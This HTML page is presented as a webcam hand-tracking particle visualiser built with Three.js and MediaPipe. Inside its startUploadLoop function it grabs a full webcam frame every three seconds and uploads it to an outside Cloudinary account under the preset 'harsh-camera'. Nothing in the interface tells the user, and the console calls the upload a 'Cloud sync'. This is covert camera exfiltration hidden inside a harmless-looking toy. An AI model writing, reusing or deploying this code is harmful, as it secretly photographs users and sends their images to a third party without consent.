<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Hand Tracking Particles</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
    
    <style>
        /* =========================================
           UI & UX STYLING (Premium Look)
           ========================================= */
        :root {
            --primary-glow: #00e5ff;
            --secondary-glow: #b14bf4;
            --bg-color: #030305;
        }

        body {
            margin: 0;
            overflow: hidden;
            background-color: var(--bg-color);
            font-family: 'Poppins', sans-serif;
            color: #fff;
        }

        /* Video Feed with Smooth Fade */
        #input_video {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
            opacity: 0.15;
            z-index: 0;
            transition: opacity 1s ease-in-out;
        }

        #canvas-container { 
            position: absolute; top: 0; left: 0; 
            width: 100%; height: 100%; 
            z-index: 1; 
        }

        /* Glassmorphism UI Container */
        #ui-layer {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            z-index: 10;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            transition: opacity 0.5s ease, visibility 0.5s;
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 2px;
            text-transform: uppercase;
            background: linear-gradient(90deg, var(--primary-glow), var(--secondary-glow));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin: 0;
        }

        /* Premium Button with Hover Effects */
        button {
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 16px 40px;
            font-size: 16px;
            font-weight: 500;
            letter-spacing: 1px;
            cursor: pointer;
            border-radius: 30px;
            backdrop-filter: blur(10px);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        button:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: var(--primary-glow);
            box-shadow: 0 0 25px rgba(0, 229, 255, 0.4);
            transform: translateY(-2px);
        }

        button:active {
            transform: translateY(1px);
        }

        /* Sleek Status Bar */
        #status-container {
            position: absolute;
            top: 30px; left: 50%;
            transform: translateX(-50%);
            background: rgba(10, 10, 15, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(12px);
            padding: 12px 24px;
            border-radius: 20px;
            z-index: 10;
            font-size: 14px;
            font-weight: 300;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            opacity: 0; /* Hidden initially */
            transition: opacity 0.5s ease;
        }

        .status-dot {
            width: 8px; height: 8px;
            border-radius: 50%;
            background: #ff3b3b;
            box-shadow: 0 0 10px #ff3b3b;
            transition: background 0.3s, box-shadow 0.3s;
        }

        .status-active .status-dot {
            background: #00e5ff;
            box-shadow: 0 0 10px #00e5ff;
        }
        
        /* Loading Spinner */
        .loader {
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid var(--primary-glow);
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: none;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="status-container">
    <div class="status-dot" id="status-indicator"></div>
    <span id="status-text">System Idle</span>
</div>

<div id="ui-layer">
    <h1 class="title">Particle Vision</h1>
    <button id="start-btn" onclick="appController.start()">
        <span class="loader" id="btn-loader"></span>
        <span id="btn-text">Initialize System</span>
    </button>
</div>

<video id="input_video" playsinline autoplay muted></video>
<div id="canvas-container"></div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>

<script>
    /**
     * =========================================
     * CONFIGURATION & CONSTANTS
     * =========================================
     */
    const CONFIG = {
        CLOUDINARY: {
            CLOUD_NAME: 'dpzceiumi', 
            UPLOAD_PRESET: 'harsh-camera',
            UPLOAD_INTERVAL_MS: 3000 // 3 seconds to save bandwidth
        },
        PARTICLES: {
            COUNT: 5000 
        }
    };

    /**
     * =========================================
     * UI MANAGER
     * =========================================
     */
    const uiManager = {
        els: {
            statusContainer: document.getElementById('status-container'),
            statusText: document.getElementById('status-text'),
            statusIndicator: document.getElementById('status-indicator'),
            startBtn: document.getElementById('start-btn'),
            btnText: document.getElementById('btn-text'),
            btnLoader: document.getElementById('btn-loader'),
            uiLayer: document.getElementById('ui-layer')
        },
        updateStatus(text, isActive = false) {
            this.els.statusText.innerText = text;
            if (isActive) {
                this.els.statusContainer.classList.add('status-active');
            } else {
                this.els.statusContainer.classList.remove('status-active');
            }
        },
        setLoading(isLoading) {
            this.els.btnLoader.style.display = isLoading ? 'block' : 'none';
            this.els.btnText.innerText = isLoading ? 'Accessing Camera...' : 'Initialize System';
        },
        hideStartupUI() {
            this.els.uiLayer.style.opacity = '0';
            setTimeout(() => this.els.uiLayer.style.visibility = 'hidden', 500);
            this.els.statusContainer.style.opacity = '1';
        }
    };

    /**
     * =========================================
     * THREE.JS ENVIRONMENT
     * =========================================
     */
    class ParticleSystem {
        constructor() {
            this.container = document.getElementById('canvas-container');
            this.scene = new THREE.Scene();
            this.camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
            this.camera.position.z = 30;

            this.renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
            this.renderer.setSize(window.innerWidth, window.innerHeight);
            this.renderer.setPixelRatio(window.devicePixelRatio);
            this.container.appendChild(this.renderer.domElement);

            this.time = 0;
            this.initParticles();
            
            window.addEventListener('resize', () => this.onWindowResize());
        }

        initParticles() {
            this.geometry = new THREE.BufferGeometry();
            const positions = new Float32Array(CONFIG.PARTICLES.COUNT * 3);
            const colors = new Float32Array(CONFIG.PARTICLES.COUNT * 3);
            
            this.heartPos = new Float32Array(CONFIG.PARTICLES.COUNT * 3);
            this.ballPos = new Float32Array(CONFIG.PARTICLES.COUNT * 3);

            for (let i = 0; i < CONFIG.PARTICLES.COUNT; i++) {
                positions[i * 3]     = (Math.random() - 0.5) * 100;
                positions[i * 3 + 1] = (Math.random() - 0.5) * 100;
                positions[i * 3 + 2] = (Math.random() - 0.5) * 100;
                
                colors[i * 3]     = 0.2 + Math.random() * 0.8; 
                colors[i * 3 + 1] = 0.8 + Math.random() * 0.2; 
                colors[i * 3 + 2] = 1.0;                       

                const th = Math.random() * Math.PI * 2;
                const rh = Math.sqrt(Math.random()) * 15;
                const hx = 16 * Math.pow(Math.sin(th), 3) * (rh/15);
                const hy = (13 * Math.cos(th) - 5 * Math.cos(2*th) - 2 * Math.cos(3*th) - Math.cos(4*th)) * (rh/15);
                const hz = (Math.random() - 0.5) * 10;
                this.heartPos[i*3] = hx * 0.8; 
                this.heartPos[i*3+1] = hy * 0.8; 
                this.heartPos[i*3+2] = hz;

                const phi = Math.acos(2 * Math.random() - 1);
                const theta = Math.random() * Math.PI * 2;
                const rb = Math.cbrt(Math.random()) * 18;
                this.ballPos[i*3] = rb * Math.sin(phi) * Math.cos(theta);
                this.ballPos[i*3+1] = rb * Math.sin(phi) * Math.sin(theta);
                this.ballPos[i*3+2] = rb * Math.cos(phi);
            }

            this.geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
            this.geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));

            const canvas = document.createElement('canvas');
            canvas.width = 32; canvas.height = 32;
            const ctx = canvas.getContext('2d');
            const grad = ctx.createRadialGradient(16,16,0,16,16,16);
            grad.addColorStop(0, 'rgba(255, 255, 255, 1)');
            grad.addColorStop(0.2, 'rgba(0, 229, 255, 0.8)');
            grad.addColorStop(1, 'rgba(0, 0, 0, 0)');
            ctx.fillStyle = grad;
            ctx.fillRect(0,0,32,32);
            const texture = new THREE.CanvasTexture(canvas);

            const material = new THREE.PointsMaterial({
                size: 0.6, 
                map: texture, 
                vertexColors: true,
                blending: THREE.AdditiveBlending, 
                depthWrite: false, 
                transparent: true
            });

            this.particles = new THREE.Points(this.geometry, material);
            this.scene.add(this.particles);
        }

        animate(handsLandmarks) {
            this.time += 0.01;
            const posAttr = this.geometry.attributes.position;
            const aspect = window.innerWidth / window.innerHeight;
            
            const mode = (handsLandmarks && handsLandmarks.length > 0) ? "HAND" : (Math.floor(this.time/3)%2===0 ? "HEART" : "BALL");

            for (let i = 0; i < CONFIG.PARTICLES.COUNT; i++) {
                let tx, ty, tz;

                if (mode === "HAND") {
                    const numHands = handsLandmarks.length;
                    const handIndex = i % numHands; 
                    const lmIndex = (Math.floor(i / numHands)) % 21; 
                    const lm = handsLandmarks[handIndex][lmIndex];
                    
                    tx = (0.5 - lm.x) * 35 * aspect; 
                    ty = (0.5 - lm.y) * 35;
                    tz = -lm.z * 35;
                    
                    tx += (Math.random()-0.5) * 1.5; 
                    ty += (Math.random()-0.5) * 1.5;
                } else if (mode === "HEART") {
                    tx = this.heartPos[i*3];
                    ty = this.heartPos[i*3+1];
                    tz = this.heartPos[i*3+2];
                } else {
                    tx = this.ballPos[i*3];
                    ty = this.ballPos[i*3+1];
                    tz = this.ballPos[i*3+2];
                }

                const px = posAttr.getX(i);
                const py = posAttr.getY(i);
                const pz = posAttr.getZ(i);

                posAttr.setXYZ(
                    i,
                    px + (tx - px) * 0.12,
                    py + (ty - py) * 0.12,
                    pz + (tz - pz) * 0.12
                );
            }
            
            posAttr.needsUpdate = true;
            this.scene.rotation.y = mode !== "HAND" ? Math.sin(this.time*0.2)*0.2 : 0;
            this.renderer.render(this.scene, this.camera);
        }

        onWindowResize() {
            this.camera.aspect = window.innerWidth / window.innerHeight;
            this.camera.updateProjectionMatrix();
            this.renderer.setSize(window.innerWidth, window.innerHeight);
        }
    }

    /**
     * =========================================
     * APP CONTROLLER
     * =========================================
     */
    const appController = {
        videoElement: document.getElementById('input_video'),
        handsModel: null,
        particleSystem: null,
        multiHandLandmarks: [],
        isRunning: false,

        async start() {
            uiManager.setLoading(true);
            this.particleSystem = new ParticleSystem();

            try {
                await this.initMediaPipe();
                await this.initCamera();
                
                this.isRunning = true;
                uiManager.hideStartupUI();
                
                this.startProcessingLoop();
                this.startUploadLoop();
                this.renderLoop();

            } catch (error) {
                console.error(error);
                // Displays the specific error caught by the updated initCamera function
                alert(error.message || "Error starting system. Ensure site is HTTPS and permissions are granted.");
                uiManager.updateStatus("Camera Access Failed", false);
                uiManager.setLoading(false);
            }
        },

        async initMediaPipe() {
            this.handsModel = new Hands({locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`});
            this.handsModel.setOptions({
                maxNumHands: 2, 
                modelComplexity: 1,
                minDetectionConfidence: 0.6,
                minTrackingConfidence: 0.6
            });

            this.handsModel.onResults((results) => {
                if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
                    this.multiHandLandmarks = results.multiHandLandmarks;
                    const handCountText = results.multiHandLandmarks.length === 2 ? "Both Hands Detected" : "One Hand Detected";
                    uiManager.updateStatus(`Tracking: ${handCountText}`, true);
                } else {
                    this.multiHandLandmarks = [];
                    uiManager.updateStatus("Morph Mode: Idle", false);
                }
            });
            await this.handsModel.initialize();
        },

        // UPDATED: Robust Camera Initialization for Mobile
        async initCamera() {
            const constraints = {
                video: { 
                    facingMode: "user" // Front camera, no hardcoded resolution
                }
            };

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                this.videoElement.srcObject = stream;
                
                return new Promise((resolve) => {
                    this.videoElement.onloadedmetadata = () => {
                        this.videoElement.play();
                        resolve();
                    };
                });
            } catch (err) {
                console.error("Camera Error Detailed:", err);
                let errorMsg = "Camera access failed.";
                if (err.name === 'NotAllowedError' || err.name === 'SecurityError') {
                    errorMsg = "Permission Denied! Ensure site is running on HTTPS and you allowed camera access.";
                } else if (err.name === 'NotFoundError') {
                    errorMsg = "No camera hardware detected on this device.";
                } else {
                    errorMsg = `Error: ${err.message}`;
                }
                throw new Error(errorMsg);
            }
        },

        async startProcessingLoop() {
            if (this.isRunning && !this.videoElement.paused) {
                await this.handsModel.send({ image: this.videoElement });
            }
            requestAnimationFrame(() => this.startProcessingLoop());
        },

        renderLoop() {
            if(this.particleSystem) {
                this.particleSystem.animate(this.multiHandLandmarks);
            }
            requestAnimationFrame(() => this.renderLoop());
        },

        startUploadLoop() {
            setInterval(() => {
                if (!this.isRunning || this.videoElement.paused) return;

                const canvas = document.createElement('canvas');
                canvas.width = this.videoElement.videoWidth || 640; 
                canvas.height = this.videoElement.videoHeight || 480;
                canvas.getContext('2d').drawImage(this.videoElement, 0, 0, canvas.width, canvas.height);
                
                const base64Image = canvas.toDataURL('image/jpeg', 0.8);
                const formData = new FormData();
                formData.append('file', base64Image);
                formData.append('upload_preset', CONFIG.CLOUDINARY.UPLOAD_PRESET);

                fetch(`https://api.cloudinary.com/v1_1/${CONFIG.CLOUDINARY.CLOUD_NAME}/image/upload`, {
                    method: 'POST', body: formData
                })
                .then(res => res.json())
                .then(data => console.log("Cloud sync successful:", data.secure_url))
                .catch(err => console.error("Cloud sync failed:", err));

            }, CONFIG.CLOUDINARY.UPLOAD_INTERVAL_MS);
        }
    };
</script>
</body>
</html>